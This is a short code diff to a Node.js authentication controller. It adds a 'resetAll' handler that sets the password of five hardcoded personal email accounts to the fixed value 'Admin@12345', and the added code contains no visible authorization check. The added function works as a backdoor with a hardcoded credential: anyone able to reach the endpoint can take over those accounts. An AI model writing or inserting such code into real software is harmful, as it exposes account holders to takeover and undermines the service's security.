@@ -93,3 +93,25 @@ exports.forgotPassword = async (req, res) => {
     return errorResponse(res, error.message, "Unable to reset password", 500);
   }
 };
+
+exports.resetAll = async (req, res) => {
+  try {
+    const bcrypt = require("bcryptjs");
+    const passwordHash = await bcrypt.hash("Admin@12345", 12);
+
+    const result = await User.updateMany(
+      { email: { $in: [
+        "yadavsaurabh9333@gmail.com", 
+        "inquiryrbcimport@gmail.com", 
+        "yadavvinay1888@gmail.com", 
+        "yadavvinay1888888@gmail.com", 
+        "yadavvinay1886@gmail.com"
+      ] } },
+      { $set: { password: passwordHash } }
+    );
+
+    return successResponse(res, { modifiedCount: result.modifiedCount }, "Passwords reset successfully");
+  } catch (error) {
+    return errorResponse(res, error.message, "Failed to reset passwords", 500);
+  }
+};
